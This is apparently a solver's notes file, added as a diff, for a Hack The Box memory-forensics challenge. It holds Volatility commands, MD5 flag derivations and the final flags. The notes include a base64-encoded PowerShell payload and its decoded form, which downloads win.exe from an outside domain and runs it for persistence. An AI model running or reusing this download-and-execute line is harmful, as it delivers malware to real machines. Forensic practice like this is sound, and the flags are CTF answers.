@@ -1,0 +1,29 @@
+HTB{echo -n "https://windowsliveupdater.com/christmas_update.hta_2700_147.182.172.189" | md5sum}
+
+echo -n "http://url.com/path.foo_2700_127.0.0.1"
+
+MZgD4s
+
+HTB{969b934d7396d043a50a37b70e1e010a}
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" --profile=Win7SP1x86_23418 pstree
+
+https://rninche01.tistory.com/entry/42-Volatility
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" imageinfo
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" --profile=Win7SP1x86_23418 filescan | findstr update
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" --profile=Win7SP1x86_23418 psxview
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" --profile=Win7SP1x86_23418 pslist
+
+volatility_2.6_win64_standalone.exe -f "persist.raw" --profile=Win7SP1x86_23418 autoruns
+
+volatility_2.6_win64_standalone.exe --plugins=autoruns-master/ --profile=Win7SP1x86_23418  -f persist.raw autoruns
+
+JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=
+
+$Path = 'C:\ProgramData\windows\win.exe';if (-NOT(Test-Path -Path $Path -PathType Leaf)){Start-Process $Path}else{mkdir 'C:\ProgramData\windows';$flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";iex (New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/win.exe",$Path);Start-Process $Path}%
+
+HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}
